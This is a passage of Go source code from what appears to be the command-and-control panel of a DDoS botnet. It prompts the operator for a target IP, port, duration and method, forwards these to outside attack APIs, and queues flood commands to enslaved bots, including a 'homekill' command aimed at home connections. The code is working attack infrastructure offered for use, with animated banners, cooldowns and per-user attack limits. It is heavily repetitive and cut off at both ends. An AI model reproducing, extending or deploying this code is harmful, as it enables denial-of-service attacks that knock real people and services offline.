            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[32m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[32m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[32m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[31m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[31m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[31m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n")) 
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[36m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[36m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[36m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))  
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[32m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[32m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[32m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[31m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[31m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[31m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n")) 
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[36m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[36m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[36m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[32m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[32m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[32m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[31m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[31m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[31m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n")) 
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[36m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[36m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[36m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[32m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[32m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[32m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[32m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))
time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[31m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[31m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[31m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[31m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n")) 
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[36m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[36m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[36m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[36m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n"))           
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(banner())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[1;37m\x1b[38;2;222;31;171mP\x1b[38;2;168;70;189mP\x1b[38;2;114;109;207mS\x1b[1;37m: -1\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;195;50;180mH\x1b[38;2;168;69;189mR\x1b[38;2;141;88;198mE\x1b[38;2;114;107;207mA\x1b[38;2;87;126;216mD\x1b[38;2;60;145;225mS\x1b[38;2;33;164;234m\x1b[1;37m: 1000\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mU\x1b[38;2;198;48;179mS\x1b[38;2;174;65;187mE\x1b[38;2;150;82;195mR\x1b[38;2;126;99;203mN\x1b[38;2;102;116;211mA\x1b[38;2;78;133;219mM\x1b[38;2;54;150;227mE\x1b[38;2;30;167;235m\x1b[1;37m: "+ username +"\r\n"))
            url := ""+ ipv +"&port="+ portv +"&time="+ timev +"&method="+ methodv +""
            tr := &http.Transport{
                ResponseHeaderTimeout: 5 * time.Second,
                DisableCompression:    true,
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(banner())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[1;37m\x1b[38;2;222;31;171mP\x1b[38;2;168;70;189mP\x1b[38;2;114;109;207mS\x1b[1;37m: -1\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;195;50;180mH\x1b[38;2;168;69;189mR\x1b[38;2;141;88;198mE\x1b[38;2;114;107;207mA\x1b[38;2;87;126;216mD\x1b[38;2;60;145;225mS\x1b[38;2;33;164;234m\x1b[1;37m: 1000\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mU\x1b[38;2;198;48;179mS\x1b[38;2;174;65;187mE\x1b[38;2;150;82;195mR\x1b[38;2;126;99;203mN\x1b[38;2;102;116;211mA\x1b[38;2;78;133;219mM\x1b[38;2;54;150;227mE\x1b[38;2;30;167;235m\x1b[1;37m: "+ username +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
                            cmdatks := "GuiltyAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }

                continue
            }
        
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            fmt.Println("\x1b[1;93m                              ║API Server Result\033[93m: \r\n\033[93m" + locformatted + "\x1b[0m\n")
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(banner())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[1;37m\x1b[38;2;222;31;171mP\x1b[38;2;168;70;189mP\x1b[38;2;114;109;207mS\x1b[1;37m: -1\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;195;50;180mH\x1b[38;2;168;69;189mR\x1b[38;2;141;88;198mE\x1b[38;2;114;107;207mA\x1b[38;2;87;126;216mD\x1b[38;2;60;145;225mS\x1b[38;2;33;164;234m\x1b[1;37m: 1000\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mU\x1b[38;2;198;48;179mS\x1b[38;2;174;65;187mE\x1b[38;2;150;82;195mR\x1b[38;2;126;99;203mN\x1b[38;2;102;116;211mA\x1b[38;2;78;133;219mM\x1b[38;2;54;150;227mE\x1b[38;2;30;167;235m\x1b[1;37m: "+ username +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
            cmdatks := "PrimitiveAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
        continue    
    }
            if cmd == "homekill" {    
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mIPv4\033[1;37m:\x1b[0m"))
            ipv, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mPort\033[1;37m:\x1b[0m"))
            portv, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mTime\033[1;37m:\x1b[0m"))
            timev, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(ban())) 
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))
            url := ""+ ipv +"&port="+ portv +"&time="+ timev +"&method=DVR"
            tr := &http.Transport{
                ResponseHeaderTimeout: 5 * time.Second,
                DisableCompression:    true,
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(ban())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
                            cmdatks := "PrimitiveAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }

                continue
            }
        
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            fmt.Println("\x1b[1;93m                              ║API Server Result\033[93m: \r\n\033[93m" + locformatted + "\x1b[0m\n")
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(ban())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
            cmdatks := "PrimitiveAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
